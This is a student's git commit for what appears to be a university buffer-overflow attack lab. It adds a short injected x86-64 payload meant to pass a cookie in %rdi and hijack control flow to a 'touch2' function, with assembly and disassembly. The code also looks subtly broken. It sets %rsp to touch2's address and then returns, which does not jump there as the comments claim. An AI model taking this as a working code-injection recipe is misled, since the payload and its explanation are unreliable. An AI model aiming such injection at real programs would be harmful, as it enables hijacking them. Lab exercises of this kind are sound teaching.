088bc5942dff3a2769b133e05386c842ab92105b
Juan Zamudio <jzamudio14@gmail.com>
2018-02-23 01:00:18 -0800

    barely done phase2

--- target2/ctarget.l2.d
+++ target2/ctarget.l2.d
@@ -5,4 +5,6 @@ ctarget.l2.o:     file format elf64-x86-64
 Disassembly of section .text:
 
 0000000000000000 <.text>:
-   0:	48 c7 c7 3a 4e db 47 	mov    $0x47db4e3a,%rdi
+   0:	48 c7 c7 3a 4e db 47 	mov    $0x47db4e3a,%rdi /* moves cookies into $rdi */
+   7:	48 c7 c4 4c 18 40 00 	mov    $0x40184c,%rsp /* moves stack pointer to touch2 */
+   e:	c3                   	retq   /* return to touch2 */
--- target2/ctarget.l2.s
+++ target2/ctarget.l2.s
@@ -1,1 +1,3 @@
-mov $0x47db4e3a,%rdi
+movq $0x47db4e3a,%rdi
+movq $0x40184c, %rsp
+retq
